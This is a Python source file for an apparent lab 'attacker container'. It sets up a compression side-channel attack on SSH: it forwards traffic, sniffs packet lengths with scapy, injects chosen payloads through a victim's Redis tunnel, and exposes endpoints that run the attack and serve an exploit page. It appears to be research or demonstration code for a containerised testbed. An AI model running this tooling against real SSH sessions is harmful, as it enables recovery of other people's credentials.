"""Attacker container.

Three things happen here:

  1. A passive TCP forwarder relays bytes between the SSH client (which
     dialled us on :2222) and the real SSH server on :22.  We do **not**
     terminate, decrypt, or alter SSH; the client pins the real server's
     host key so any attempt at active in-the-middle would be rejected.

  2. A scapy AsyncSniffer captures every TCP segment on ports 22 / 2222
     and records (timestamp, direction, payload size, flags).  This is
     the side-channel signal we need: even though the bytes are
     encrypted, the SSH binary packet protocol's per-packet length is
     directly observable in the TCP segment that carries it.

  3. An aiohttp HTTP control API on :9000 lets the verification driver
     query / clear the recorded packet log, trigger the client to send
     a Redis AUTH, and run the full attack.

The attack injects payloads by opening TCP connections to the client's
exposed Redis tunnel port.  Each connection creates a ``direct-tcpip``
SSH channel that shares the c->s zlib compression context with the
victim's Redis AUTH traffic.
"""

import asyncio
import logging
import os
import threading
import time
from typing import Any

import aiohttp
from aiohttp import web
from scapy.all import AsyncSniffer  # type: ignore
from scapy.layers.inet import IP, TCP  # type: ignore

from attacker.attack.adapters.browser_bridge import BrowserBridge

# Unified engine.
from attacker.attack.engine import run_attack as run_unified_attack
from attacker.attack.adapters.direct import DirectAdapter
from attacker.attack.adapters.beast import BeastAdapter
from attacker.attack.adapters.ansible import AnsibleAdapter

LOG = logging.getLogger("attacker")

SERVER_HOST = os.environ.get("SERVER_HOST", "server")
SERVER_PORT = int(os.environ.get("SERVER_PORT", "22"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))
HTTP_PORT = int(os.environ.get("HTTP_PORT", "9000"))
CLIENT_CONTROL_URL = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
TUNNEL_PORT = int(os.environ.get("TUNNEL_PORT", "6379"))

SNIFF_FILTER = f"tcp and (port {SERVER_PORT} or port {LISTEN_PORT})"
SNIFF_IFACE = os.environ.get("SNIFF_IFACE", "eth0")


# --------------------------------------------------------------------------
# Packet log (shared between sniffer thread and asyncio handlers)
# --------------------------------------------------------------------------

class PacketLog:
    def __init__(self) -> None:
        self._records: list[dict[str, Any]] = []
        self._lock = threading.Lock()

    def add(self, record: dict[str, Any]) -> None:
        with self._lock:
            self._records.append(record)

    def snapshot(self, include_acks: bool = False) -> list[dict[str, Any]]:
        with self._lock:
            if include_acks:
                return list(self._records)
            return [r for r in self._records if r["tcp_payload_len"] > 0]

    def clear(self) -> None:
        with self._lock:
            self._records.clear()

    def __len__(self) -> int:
        with self._lock:
            return len(self._records)


PACKET_LOG = PacketLog()
BROWSER_BRIDGE = BrowserBridge()


def _on_packet(pkt) -> None:
    if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
        return
    ip = pkt[IP]
    tcp = pkt[TCP]
    # TCP payload length = total IP length - IP header - TCP header
    tcp_payload_len = ip.len - (ip.ihl * 4) - (tcp.dataofs * 4)
    record = {
        "ts": time.time(),
        "src": ip.src,
        "dst": ip.dst,
        "sport": int(tcp.sport),
        "dport": int(tcp.dport),
        "flags": str(tcp.flags),
        "seq": int(tcp.seq),
        "ack": int(tcp.ack),
        "tcp_payload_len": int(tcp_payload_len),
    }
    PACKET_LOG.add(record)


def start_sniffer() -> AsyncSniffer:
    LOG.info(
        "starting AsyncSniffer iface=%s filter=%r",
        SNIFF_IFACE, SNIFF_FILTER,
    )
    sniffer = AsyncSniffer(
        iface=SNIFF_IFACE,
        filter=SNIFF_FILTER,
        prn=_on_packet,
        store=False,
    )
    sniffer.start()
    return sniffer


# --------------------------------------------------------------------------
# Passive TCP forwarder
# --------------------------------------------------------------------------

async def _pipe(src: asyncio.StreamReader, dst: asyncio.StreamWriter, label: str) -> None:
    total = 0
    try:
        while True:
            data = await src.read(65536)
            if not data:
                break
            total += len(data)
            dst.write(data)
            await dst.drain()
    except (ConnectionResetError, BrokenPipeError, asyncio.IncompleteReadError):
        pass
    except Exception:  # noqa: BLE001
        LOG.exception("[%s] pipe error", label)
    finally:
        try:
            dst.close()
        except Exception:  # noqa: BLE001
            pass
        # Debug-level: the Ansible variant opens thousands of short-lived
        # SSH connections and we don't want to log each one.
        LOG.debug("[%s] pipe closed (forwarded %d bytes)", label, total)


async def handle_inbound(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
) -> None:
    peer = writer.get_extra_info("peername")
    LOG.debug("client connected from %s", peer)
    try:
        upstream_reader, upstream_writer = await asyncio.open_connection(
            SERVER_HOST, SERVER_PORT,
        )
    except OSError as exc:
        LOG.error("cannot connect to upstream %s:%d: %s", SERVER_HOST, SERVER_PORT, exc)
        writer.close()
        return
    LOG.debug("upstream connected to %s:%d", SERVER_HOST, SERVER_PORT)

    await asyncio.gather(
        _pipe(reader, upstream_writer, "c->s"),
        _pipe(upstream_reader, writer, "s->c"),
    )
    LOG.debug("forwarder session done for %s", peer)


# --------------------------------------------------------------------------
# HTTP control API
# --------------------------------------------------------------------------

async def handle_status(request: web.Request) -> web.Response:
    return web.json_response({
        "ok": True,
        "server_target": f"{SERVER_HOST}:{SERVER_PORT}",
        "listen_port": LISTEN_PORT,
        "client_control_url": CLIENT_CONTROL_URL,
        "sniff_iface": SNIFF_IFACE,
        "sniff_filter": SNIFF_FILTER,
        "packet_log_len": len(PACKET_LOG),
        "browser_connected": BROWSER_BRIDGE.connected,
    })


async def handle_packet_log(request: web.Request) -> web.Response:
    include_acks = request.query.get("include_acks", "0") == "1"
    return web.json_response({
        "count": len(PACKET_LOG),
        "records": PACKET_LOG.snapshot(include_acks=include_acks),
    })


async def handle_clear_log(request: web.Request) -> web.Response:
    PACKET_LOG.clear()
    return web.json_response({"ok": True})


async def handle_trigger_secret(request: web.Request) -> web.Response:
    session: aiohttp.ClientSession = request.app["http"]
    async with session.post(f"{CLIENT_CONTROL_URL}/send_secret") as resp:
        body = await resp.json()
        return web.json_response({"ok": True, "client_response": body})


async def handle_trigger_payload(request: web.Request) -> web.Response:
    """Send a payload through the client's exposed tunnel port forward.

    The attacker opens a TCP connection to the client's Redis tunnel
    and writes the payload.  This data enters the SSH tunnel as
    direct-tcpip channel data in the c->s direction.
    """
    payload = await request.read()
    try:
        reader, writer = await asyncio.open_connection(
            CLIENT_HOST, TUNNEL_PORT,
        )
        writer.write(payload)
        await writer.drain()
        await asyncio.sleep(0.05)
        writer.close()
        await writer.wait_closed()
    except Exception as exc:  # noqa: BLE001
        LOG.exception("trigger_payload (tunnel) failed")
        return web.json_response(
            {"ok": False, "error": str(exc)}, status=500,
        )
    return web.json_response({"ok": True, "bytes_sent": len(payload)})


# --------------------------------------------------------------------------
# BEAST variant: exploit page + WebSocket
# --------------------------------------------------------------------------

async def handle_exploit(request: web.Request) -> web.Response:
    with open("/app/exploit.html") as f:
        return web.Response(text=f.read(), content_type="text/html")


async def handle_ws(request: web.Request) -> web.WebSocketResponse:
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    BROWSER_BRIDGE.set_ws(ws)
    LOG.info("browser connected via WebSocket")

    try:
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                BROWSER_BRIDGE.on_message(msg.json())
            elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                break
    finally:
        BROWSER_BRIDGE.clear_ws()
        LOG.info("browser disconnected")

    return ws


# --------------------------------------------------------------------------
# Unified /run_attack endpoint — dispatches to the engine via per-variant
# adapters.
# --------------------------------------------------------------------------

_ADAPTER_BY_VARIANT: dict[str, Any] = {
    "direct": DirectAdapter,
    "beast": BeastAdapter,
    "ansible": AnsibleAdapter,
}

# Guards against concurrent /run_attack calls — two attacks interleaving on
# the shared SSH compressor would destroy each other's measurements.
_ATTACK_LOCK = asyncio.Lock()

# Cleared at the start of each /run_attack; set by /cancel to short-circuit
# an in-flight attack between positions.
_CANCEL_EVENT = asyncio.Event()


def _build_adapter(adapter_cls: Any, variant: str) -> Any:
    if variant == "direct":
        return adapter_cls(packet_log=PACKET_LOG)
    if variant == "beast":
        return adapter_cls(packet_log=PACKET_LOG, bridge=BROWSER_BRIDGE)
    if variant == "ansible":
        return adapter_cls(packet_log=PACKET_LOG)
    raise NotImplementedError(f"adapter construction not wired for variant {variant!r}")


async def handle_run_attack(request: web.Request) -> web.Response:
    """Unified attack endpoint: /run_attack with {"variant": ..., "config": {...}}."""
    body: dict[str, Any] = {}
    if request.body_exists:
        try:
            body = await request.json()
        except Exception:  # noqa: BLE001
            body = {}
    variant = body.get("variant", "direct")
    overrides = dict(body.get("config", {}) or {})
    expected = body.get("expected")
    if expected is not None:
        overrides["expected"] = expected

    adapter_cls = _ADAPTER_BY_VARIANT.get(variant)
    if adapter_cls is None:
        return web.json_response(
            {"ok": False, "error": f"unknown variant {variant!r}"}, status=400,
        )
    if variant == "beast" and not BROWSER_BRIDGE.connected:
        return web.json_response(
            {"ok": False, "error": "browser not connected"}, status=503,
        )
    if _ATTACK_LOCK.locked():
        return web.json_response(
            {"ok": False, "error": "another attack is in progress"}, status=409,
        )

    config = adapter_cls.default_config().overlay(overrides)
    adapter = _build_adapter(adapter_cls, variant)

    LOG.info("HTTP /run_attack: variant=%s label=%r", variant, config.label)
    _CANCEL_EVENT.clear()
    async with _ATTACK_LOCK:
        try:
            result = await run_unified_attack(
                adapter=adapter, config=config, cancel_event=_CANCEL_EVENT,
            )
        except Exception as exc:  # noqa: BLE001
            LOG.exception("unified attack failed")
            return web.json_response(
                {"ok": False, "error": str(exc), "variant": variant}, status=500,
            )
    LOG.info("unified attack done: recovered=%r", result["recovered"])
    return web.json_response({"ok": True, "variant": variant, **result})


async def handle_cancel(request: web.Request) -> web.Response:
    """Set the cancel event — in-flight /run_attack will return shortly."""
    if _ATTACK_LOCK.locked():
        _CANCEL_EVENT.set()
        return web.json_response({"ok": True, "cancelled": True})
    return web.json_response({"ok": True, "cancelled": False})


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

async def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(name)s %(levelname)s %(message)s",
    )
    # Silence the per-request aiohttp access log -- the Ansible variant
    # fires thousands of /send_secret_ansible calls and each one would
    # otherwise add noise to the attack progress log.
    logging.getLogger("aiohttp.access").setLevel(logging.WARNING)

    sniffer = start_sniffer()

    # Start the TCP forwarder.
    forwarder = await asyncio.start_server(
        handle_inbound, host="0.0.0.0", port=LISTEN_PORT,
    )
    sockets = ", ".join(str(s.getsockname()) for s in forwarder.sockets)
    LOG.info("TCP forwarder listening on %s -> %s:%d", sockets, SERVER_HOST, SERVER_PORT)

    # Start the HTTP control API.
    http_session = aiohttp.ClientSession()
    app = web.Application()
    app["http"] = http_session
    app.router.add_get("/status", handle_status)
    app.router.add_get("/packet_log", handle_packet_log)
    app.router.add_post("/clear_log", handle_clear_log)
    app.router.add_post("/trigger_secret", handle_trigger_secret)
    app.router.add_post("/trigger_payload", handle_trigger_payload)
    app.router.add_post("/run_attack", handle_run_attack)
    app.router.add_post("/cancel", handle_cancel)
    app.router.add_get("/exploit", handle_exploit)
    app.router.add_get("/ws", handle_ws)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
    await site.start()
    LOG.info("HTTP control API listening on 0.0.0.0:%d", HTTP_PORT)

    try:
        async with forwarder:
            await forwarder.serve_forever()
    finally:
        sniffer.stop()
        await http_session.close()
    return 0


if __name__ == "__main__":
    import sys
    try:
        sys.exit(asyncio.run(main()))
    except (KeyboardInterrupt, SystemExit):
        pass
